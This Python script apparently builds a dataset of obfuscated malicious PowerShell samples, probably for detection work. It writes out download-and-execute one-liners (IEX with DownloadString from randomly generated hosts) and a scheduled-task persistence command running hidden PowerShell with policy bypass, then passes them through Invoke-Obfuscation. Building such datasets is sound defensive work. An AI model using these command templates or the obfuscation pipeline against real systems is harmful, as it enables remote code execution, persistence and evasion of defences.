#Generates a powershell script from the set of random malicious commands
import random
import string
import pexpect
import os
import sys
import math
import multiprocessing
import time

def get_random_dest():
	path = "/" + "".join([random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(5,10))])
	if(random.randint(0,1) == 0):
		#Return a domain
		ext = "." + "".join([random.choice(string.ascii_lowercase) for _ in range(random.randint(2,3))])
		hostname = "".join([random.choice(string.ascii_letters) for _ in range(random.randint(10,20))])
		domain = "http://" + hostname + ext + path
		return domain
	else:
		ip = str(random.randint(0,200)) + "." + str(random.randint(0,200)) + "." + str(random.randint(0,200))+ "." + str(random.randint(0,200))
		return ip + path

def get_random_text(min, max):
	return "".join([random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(min,max))])

def get_random_word():
	return get_random_text(3,10)

def get_random_regkey():
	key_name = get_random_word()
	key_location = "HKCU:\\" + "\\".join([get_random_word() for _ in range(random.randint(2,5))])
	return key_location, key_name

def get_random_shellcode():
	shellcode = ",".join([hex(random.randint(0,255)) for _ in range(150)])
	return shellcode

def remote_payload_cmd():
	dest = get_random_dest()
	return "Invoke-Expression (New-Object Net.WebClient).DownloadString(\"" + dest + "\") \n"

#https://blog.cobaltstrike.com/2013/11/09/schtasks-persistence-with-powershell-one-liners/
def schtasks_persistence_cmd():
	cmd = "schtasks /create /tn OfficeUpdatorB /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c "
	cmd += "'" + remote_payload_cmd()[:-1] + "'\" /sc onidle /i 30 \n"
	return cmd

def set_registry_key_cmd():
	key_location, key_name = get_random_regkey()
	cmd = f"Set-ItemProperty '{key_location}' -Name '{key_name}' -Value {get_random_text(50,100)}\n"
	return cmd

def inject_shellcode_cmd():
	cmd = "[Byte[]] $Shellcode = @(" + get_random_shellcode() + ") \n";
	cmd += "".join(open("./scripts/inject_shellcode.ps1").readlines())
	return cmd

# commands = [remote_payload_cmd, schtasks_persistence_cmd, set_registry_key_cmd, inject_shellcode_cmd]
commands = [remote_payload_cmd, schtasks_persistence_cmd, set_registry_key_cmd] # inject shellcode seems to be broken when we try to obfuscate it :c

# AST doesnt work with schtasks and remote_payload
# set registry key has a 100% fail rate

def generate_script():
	script = ""
	script+= random.choice(commands)()
	#for f in [random.choice(commands) for _ in range(5)]:
		#script+=f()

	return script

def generate_raw(n):
	for i in range(n):
		script = generate_script()
		f = open(f"res/dataset-{i}-raw.ps1",'w')
		f.write(script)
		f.close()

#invoke_obfuscation_choices = ["TOKEN,ALL,1,HOME","AST,ALL,1,HOME","STRING,ALL,1,HOME","ENCODING,ALL,1,HOME"]
invoke_obfuscation_choices = ["TOKEN,ALL,1,HOME","STRING,ALL,1,HOME"]*8
invoke_obfuscation_choices += [f"ENCODING,{str(i+1)},1,HOME" for i in range(8)]
# print(invoke_obfuscation_choices)

def obfuscate(script_num, conn):

	package = [[],[],[],[]]
	try:
		#obfs_commands = ",".join([random.choice(invoke_obfuscation_choices) for _ in range(random.randint(1,4))])
		obfs_commands = random.choice(invoke_obfuscation_choices)

		if(random.randint(0,1) == 0):
			obfs_commands+=",COMPRESS,1,1,HOME"

		obfs_commands+= ",OUT"

		print(f"Script #{script_num}, commands for Invoke-Obfuscation = {obfs_commands}")

		p = pexpect.spawn(f"pwsh obfuscate.ps1 -Filename ./res/dataset-{str(script_num)}-raw.ps1 -Command {obfs_commands}")
		#p.read_nonblocking(size=10000)
		p.expect_exact("Enter path for output file (or leave blank for default): ")
		p.sendline(f"./res/dataset-{str(script_num)}-obfs.ps1")
		p.wait() #this is the only one that works multithreaded
		#p.interact() #this works but only singlethreaded
		#p.expect(pexpect.EOF) this should work but it just doesnt
		print(f"Script #{script_num} obfuscation succeeded!")
		p.close()

		package[0].append(str(script_num))
		package[1].append(obfs_commands)

	except Exception as e:
		print(f"!!! Obfuscation for script #{script_num} failed! Command = {obfs_commands}")
		print(e)

		package[2].append(str(script_num))
		package[3].append(obfs_commands)

	conn.send(package)
	conn.close()
	return


THREAD_NUM = int(sys.argv[2])

success = []
failed = []
succ_cmds = []
failed_cmds = []

def run_threads(targets):
	global success, failed, succ_cmds, failed_cmds
	pipes = []

	for target in targets:
		parent, child = multiprocessing.Pipe()
		t = multiprocessing.Process(target=obfuscate, args=[target, child])
		t.start()
		pipes.append([parent,target,t])

	for pipe,target,thread in pipes:
		try:
			if(not pipe.poll(105)):
				raise TimeoutException() #yes i know this doesn't do what i want it to do, yes i am too lazy to do it properly

			package = pipe.recv()
			print(f"Received package from script #{target}")
			success += package[0]
			succ_cmds += package[1]
			failed += package[2]
			failed_cmds += package[3]

			thread.join()

		except Exception as e:
			print(f"Timeout while polling for result from script # {target}")
			failed.append(target)
			failed_cmds.append("TIMEOUT")

			thread.terminate()

	return success, failed, succ_cmds, failed_cmds

def generate_obfs(n):
	
	print("Generating fake malicious powershell")
	generate_raw(n)

	print("Converting to obfuscated powershell")
	
	for x in range(math.floor(n/THREAD_NUM)):
		targets = [x*THREAD_NUM + y for y in range(THREAD_NUM)]
		run_threads(targets)
	
	run_threads([x + THREAD_NUM*math.floor(n/THREAD_NUM) for x in range(n % THREAD_NUM)])

	print(f"Succeeded {str(len(success))}/{str(n)}")

	for fail in failed:
		print(f"Deleting failed script {fail}")
		os.system(f"rm res/dataset-{str(fail)}-raw.ps1")

	#print("succeded", succ_cmds)
	#print("failed", failed_cmds)
	print("Failed #", failed)

generate_obfs(int(sys.argv[1]))